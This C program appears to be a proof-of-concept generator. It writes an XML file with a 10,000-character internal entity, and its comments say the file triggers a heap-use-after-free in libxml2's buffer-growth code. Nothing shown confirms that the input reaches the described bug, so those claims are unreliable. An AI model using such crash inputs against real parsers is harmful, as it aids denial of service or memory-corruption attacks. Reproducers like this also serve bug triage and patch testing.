#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Crafted XML with malformed internal entity that triggers heap-use-after-free */
    /* The vulnerability is in libxml2's xmlBufResetInput when xmlBufGrow reallocs */
    /* A large entity value causes buffer growth, freeing old buffer, but input->cur */
    /* is not updated, leading to read from freed memory in error reporting */

    /* XML prolog */
    fprintf(f, "<?xml version=\"1.0\"?>\n");
    
    /* DOCTYPE with internal entity that will cause buffer reallocation */
    fprintf(f, "<!DOCTYPE foo [\n");
    fprintf(f, "<!ENTITY x \"");
    
    /* Generate a long entity value to trigger buffer growth */
    /* The parser will allocate 8193 bytes initially, then grow it */
    for (int i = 0; i < 10000; i++) {
        fputc('A', f);
    }
    
    fprintf(f, "\">\n");
    fprintf(f, "]>\n");
    
    /* Reference the entity to trigger parsing */
    fprintf(f, "<root>&x;</root>\n");

    fclose(f);
    return 0;
}